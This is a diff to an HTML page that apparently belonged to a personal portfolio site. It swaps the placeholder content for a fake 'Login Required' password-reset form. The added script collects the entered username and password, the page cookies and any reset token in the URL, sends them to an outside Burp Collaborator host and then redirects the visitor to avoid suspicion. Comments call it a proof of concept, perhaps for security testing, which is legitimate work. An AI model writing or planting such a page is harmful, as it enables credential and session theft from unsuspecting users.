@@ -1,67 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>I am lazy so this page is still in development</title>
-  <link rel="stylesheet" type="text/css" href="style.css">
-  <script src="script.js"></script>
+  <title>Login Required</title>
+  <style>
+    body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f0f0; }
+    .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
+    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+    button { background: #007bff; color: white; padding: 10px; border: none; border-radius: 4px; cursor: pointer; width: 100%; }
+    button:hover { background: #0056b3; }
+  </style>
 </head>
 <body>
-  <header>
-    <h1>Hola</h1>
-    <nav>
-      <ul>
-        <li><a href="#about">About</a></li>
-        <li><a href="#projects">Projects</a></li>
-        <li><a href="#contact">Contact</a></li>
-      </ul>
-    </nav>
-  </header>
+  <div class="login-box">
+    <h2>Login Required</h2>
+    <p>Please re-authenticate to reset your password.</p>
+    <input type="text" id="username" placeholder="Username or Email">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="captureCredentials()">Login</button>
+  </div>
 
-  <section id="hero">
-    <div class="hero-content">
-      <h2>I am so lazy so this page is still in development</h2>
-      <p>Explore the world of /*/ with me</p>
-    </div>
-  </section>
+  <script>
+    function captureCredentials() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const cookies = document.cookie || 'none';
+      const data = `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&cookies=${encodeURIComponent(cookies)}`;
 
-  <section id="about">
-    <div class="container">
-      <h2>About Me</h2>
-      <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec eleifend lorem nec semper consequat.</p>
-      <p>Curabitur ultricies sapien in tellus euismod, ut ultricies metus faucibus.</p>
-    </div>
-  </section>
+      // Exfiltrate to Burp Collaborator
+      const collaboratorUrl = 'https://97efvbftrobz7esa3qfi8icia9gz4o.oastify.com'; // Replace with your Burp Collaborator URL
+      fetch(collaboratorUrl + '?' + data, { mode: 'no-cors' })
+        .catch(() => {}); // Ignore CORS errors for PoC
 
-  <section id="projects">
-    <div class="container">
-      <h2>Projects</h2>
-      <div class="project">
-        <h3>Project Title 1</h3>
-        <p>Description of the project.</p>
-      </div>
-      <div class="project">
-        <h3>Project Title 2</h3>
-        <p>Description of the project.</p>
-      </div>
-    </div>
-  </section>
+      // Optionally, redirect to avoid suspicion
+      window.location = '/forgot-password';
+    }
 
-  <section id="contact">
-    <div class="container">
-      <h2>Contact Me</h2>
-      <form>
-        <input type="text" placeholder="Your Name">
-        <input type="email" placeholder="Your Email">
-        <textarea placeholder="Your Message"></textarea>
-        <button type="submit">Send Message</button>
-      </form>
-    </div>
-  </section>
-
-  <footer>
-    <div class="container">
-      <p>&copy; 2023 '*'. All rights reserved.</p>
-    </div>
-  </footer>
+    // Capture reset token from URL (if present)
+    const urlParams = new URLSearchParams(window.location.search);
+    const resetToken = urlParams.get('token') || 'none';
+    if (resetToken !== 'none') {
+      fetch('https://97efvbftrobz7esa3qfi8icia9gz4o.oastify.com?token=' + encodeURIComponent(resetToken), { mode: 'no-cors' })
+        .catch(() => {});
+    }
+  </script>
 </body>
 </html>
